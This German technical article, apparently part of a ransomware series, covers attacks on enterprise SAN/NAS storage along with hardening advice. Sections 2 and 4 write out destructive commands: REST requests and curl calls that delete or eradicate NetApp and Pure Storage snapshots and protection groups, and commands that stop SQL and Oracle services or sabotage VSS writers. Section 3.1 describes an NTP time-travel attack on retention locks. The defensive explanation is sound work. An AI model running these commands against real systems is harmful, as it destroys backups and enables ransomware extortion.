# Ransomware – Band 24: Enterprise-Storage- und SAN/NAS-API-Targeting

Technischer Deep Dive: Storage-Array-Architektur (NetApp, Pure Storage, Dell), REST-API-Snapshot-Sabotage, Immutable Storage Locks (SafeMode, SnapLock), NTP-Time-Travel-Angriffe, DBMS-VSS-Writer-Targeting und resiliente Storage-Härtung.

---

## 1. Zentrale Speichersysteme im Fadenkreuz

In Enterprise-Rechenzentren liegen produktive Daten, virtuelle Maschinen (VMware ESXi VMFS-Datastores, Hyper-V CSV) und Datenbanken selten auf lokalen Festplatten einzelner Server. Sie residieren auf hochverfügbaren zentralen Enterprise-Storage-Arrays (SAN via Fibre Channel/iSCSI oder NAS via NFS/SMB).

```
+----------------------------------------------------------------------------+
| Enterprise Storage Angriffsvektoren                                        |
+----------------------------------------------------------------------------+
| [ Kompromittierter Admin-PC / Jump Host ]                                  |
|            |                                                               |
|            +---> 1. Gestohlene Storage-Admin Credentials (Browser/KeePass)  |
|            +---> 2. Ungesicherte REST-APIs im Management-VLAN              |
|            +---> 3. Hardcoded SSH-Keys in Backup-Skripten                  |
|            |                                                               |
|            v HTTPS REST-API / SSH CLI                                      |
| +------------------------------------------------------------------------+ |
| | Storage Controller (NetApp ONTAP / Pure FlashArray / Dell PowerStore)  | |
| |                                                                        | |
| |   [ Sabotage-Ablauf: ]                                                 | |
| |     1. Enumeration aller Volumes und LUNs                              | |
| |     2. Massenweises Löschen aller Hardware-Snapshots                   | |
| |     3. Deaktivieren von Replikations- und Schutzrichtlinien            | |
| |     4. Überschreiben oder Löschen der LUNs                             | |
| +------------------------------------------------------------------------+ |
|            |                                                               |
|            v Block-Level I/O (FC / iSCSI / NFS)                            |
| +------------------------------------------------------------------------+ |
| | Physische Datenblöcke / NVMe-oF / SSD-Pools                            | |
+----------------------------------------------------------------------------+
```

### 1.1 Warum Angreifer Storage-APIs priorisieren
- **Massenwirkung:** Statt tausende Windows- und Linux-Server einzeln zu verschlüsseln, genügt die Sabotage weniger zentraler Storage-Controller, um den gesamten Geschäftsbetrieb eines Konzerns lahmzulegen.
- **Backup-Vernichtung:** Hardware-basierte Storage-Snapshots gelten vielen Unternehmen fälschlicherweise als unzerstörbares "Backup". Gelingt dem Angreifer der Zugriff auf das Storage-Management, werden diese Snapshots in Sekunden vernichtet.

---

## 2. REST-API Snapshot-Sabotage im Detail

Moderne Storage-Systeme werden vollständig über REST-APIs gesteuert. Angreifer nutzen gestohlene API-Tokens oder LDAP/AD-integrierte Admin-Konten.

### 2.1 NetApp ONTAP REST-API Targeting

NetApp ONTAP stellt eine standardisierte OpenAPI-Schnittstelle über HTTPS bereit.

#### 1. Enumeration aller Volumes und Snapshots:
```http
GET /api/storage/volumes HTTP/1.1
Host: storage-cluster01.corp.internal
Authorization: Basic YWRtaW46U2VjcmV0UGFzc3dvcmQxMjM=
Accept: application/json
```
Antwort liefert UUIDs aller Volumes:
```json
{
  "records": [
    { "uuid": "02c9e252-411a-11ec-9bb8-005056b3e218", "name": "vol_vmware_prod_01" },
    { "uuid": "02c9e253-411a-11ec-9bb8-005056b3e218", "name": "vol_sql_databases" }
  ]
}
```

#### 2. Massenhaftes Löschen der Snapshots:
```http
DELETE /api/storage/volumes/02c9e252-411a-11ec-9bb8-005056b3e218/snapshots/hourly.2026-11-05_0200 HTTP/1.1
Host: storage-cluster01.corp.internal
Authorization: Basic YWRtaW46U2VjcmV0UGFzc3dvcmQxMjM=
```
Ransomware-Skripte iterieren in Schleifen über alle Volumes und setzen für jeden Snapshot einen HTTP-`DELETE`-Aufruf ab.

### 2.2 Pure Storage FlashArray REST-API Targeting

Pure Storage FlashArray nutzt API-Token-Authentifizierung (`x-api-token`).

#### Sabotage-Sequenz über FlashArray REST API 2.x:
1. **Löschen von Protection Groups (pgroups):**
   ```bash
   curl -X DELETE -k -H "x-api-token: 9a8b7c6d-..." \
       "https://pure-flasharray01.corp.internal/api/2.15/protection-groups?names=pgroup-prod-vms"
   ```
2. **Vernichtung aller Volume-Snapshots mit sofortigem Erase:**
   ```bash
   # Normales Löschen verschiebt in 'Destroyed' (Erhalt für 24h)
   # 'eradicate=true' erzwingt sofortiges endgültiges Überschreiben:
   curl -X DELETE -k -H "x-api-token: 9a8b7c6d-..." \
       "https://pure-flasharray01.corp.internal/api/2.15/volume-snapshots?names=vol_erp.snap_20261105&eradicate=true"
   ```

---

## 3. Immutable Storage Locks und Schutzmechanismen

Um API-basierte Sabotage abzuwehren, führten Storage-Hersteller unveränderbare Snapshots (Immutable Snapshots / WORM) ein:
- **NetApp SnapLock:** Setzt eine strikte Aufbewahrungsfrist (Retention Period). Vor Ablauf darf selbst der `admin` oder der NetApp-Support den Snapshot nicht löschen.
- **Pure Storage SafeMode:** Verhindert das manuelle Löschen von Snapshots. Eradikation ist softwareseitig gesperrt; Änderungen erfordern einen PIN-Code von zwei autorisierten Firmenansprechpartnern gegenüber dem Pure-Support (Dual-Custody).
- **Dell PowerStore Retention Lock:** Unveränderbare Sicherung von Block- und File-LUNs.

### 3.1 Angriffsvektor: NTP-Manipulation ("Time Travel Attack")

Ist ein Snapshot bis zum `31. Dezember 2026` geschützt, prüfen Storage-Controller die Systemzeit zur Durchsetzung des Schutzes.
- **Angriffsmechanik:** Gelingt es dem Angreifer, den internen NTP-Server (Active Directory Domain Controller) zu kompromittieren oder die NTP-Konfiguration des Storage-Arrays auf einen vom Angreifer kontrollierten Zeitserver umzuleiten:
  1. Der Angreifer stellt die NTP-Zeit auf den `01. Januar 2027` vor.
  2. Der Storage-Controller synchronisiert die manipulierte Zeit.
  3. Die Retention-Periode gilt nun als "abgelaufen".
  4. Die reguläre REST-API akzeptiert nun den `DELETE`-Befehl und löscht den Snapshot.
- **Gegenmaßnahme:** Moderne Storage-Firmware implementiert unabhängige Hardware-Compliance-Uhren (Real-Time Clocks, RTC), die plötzliche Zeitsprünge nach vorne verwerfen und das Array bei Manipulationsversuchen sperren.

---

## 4. Datenbank- und VSS-Writer-Targeting

Enterprise-Datenbanken (Microsoft SQL Server, Oracle, PostgreSQL) halten ihre Datendateien permanent im Schreibzugriff geöffnet. Eine naive Ransomware kann geöffnete `.mdf`-Dateien nicht verschlüsseln, da Windows die Dateihandles sperrt (`ERROR_SHARING_VIOLATION`).

```
+-----------------------------------------------------------------------+
| Datenbank-Neutralisierungsmethoden                                    |
+-----------------------------------------------------------------------+
| Methode A: Der brachiale Dienst-Stopp                                 |
|   Stop-Service -Name "MSSQLSERVER" -Force                             |
|   Net stop OracleServiceORCL                                          |
|   Folge: Datenbank wird abrupt entladen; Handles werden frei;         |
|          Ransomware verschlüsselt die Roh-Dateien (.mdf, .ldf).       |
|                                                                       |
| Methode B: VSS-Writer Sabotage                                        |
|   vssadmin list writers                                               |
|   - Sucht 'SqlServerWriter' und 'Oracle VSS Writer'                   |
|   - Deaktiviert Writer-Dienste, um Applikationskonsistenz zu brechen  |
+-----------------------------------------------------------------------+
```

---

## 5. Resiliente Enterprise-Storage-Härtungsarchitektur

```
+-----------------------------------------------------------------------+
| Storage-Sicherheitsarchitektur nach Best-Practice                     |
+-----------------------------------------------------------------------+
| [ Produktiv-Netzwerk (VLAN 10) ]     [ OOB Management (VLAN 99) ]     |
|   - Server / VMs / Clients             - Nur dedizierte IP-Subnetze   |
|   - Kein Routing zu VLAN 99!           - Kein Internet-Zugang         |
|                                                      |                |
|                                        +-------------+-------------+  |
|                                        | Hardware Bastion Host     |  |
|                                        | - Hardware-MFA (FIDO2)    |  |
|                                        | - Lokale Accounts (kein AD|  |
|                                        +-------------+-------------+  |
|                                                      |                |
|                                        +-------------v-------------+  |
|                                        | Storage Controller        |  |
|                                        | - SafeMode / SnapLock AKTIV| |
|                                        | - NTP mit NTS (Auth)      |  |
|                                        | - REST-API: IP-Whitelisting| |
|                                        +---------------------------+  |
+-----------------------------------------------------------------------+
```

### 5.1 Fünf Kernregeln für Storage-Administratoren

1. **Strikte Out-of-Band (OOB) Netztrennung:** Storage-Management-Ports (IPMI, e0M, iDRAC, Web-UI) dürfen niemals im regulären Server- oder Client-Netzwerk erreichbar sein. Zugriff ausschließlich über dedizierte Jump-Hosts im Isolationsnetz.
2. **Entkopplung vom Active Directory:** Storage-Management darf sich niemals gegen das produktive Active Directory authentifizieren. Ist das AD kompromittiert, fällt sonst zeitgleich die gesamte Storage-Infrastruktur. Nur lokale, gehärtete Konten mit Hardware-Token (FIDO2/U2F).
3. **SafeMode / Immutable Snapshots erzwingen:** Snapshots müssen unveränderbar sein, mit einer Mindesthaltedauer von 14 bis 30 Tagen.
4. **NTP-Authentifizierung (Network Time Security / NTS):** Zeitserver müssen kryptographisch signiert sein, um Time-Travel-Angriffe auf WORM-Locks zu unterbinden.
5. **Air-Gapped Replikation:** Asynchrones Spiegeln von Snapshots auf ein sekundäres Storage-System an einem getrennten Brandabschnitt/Standort, das nur Pull-Zugriff besitzt (das Primärsystem kann das Sekundärsystem nicht administrieren oder löschen).

---

## Quellen
- [Q9] Sophos – Kompromittierte Backups bei Ransomware-Angriffen
- [Q80] NetApp – Technical Report: Protect Against Ransomware with ONTAP Solutions
- [Q81] Pure Storage – FlashArray SafeMode Snapshot Architecture & Security Guide
- [Q82] Dell Technologies – PowerStore Cybersecurity and Ransomware Recovery Strategies
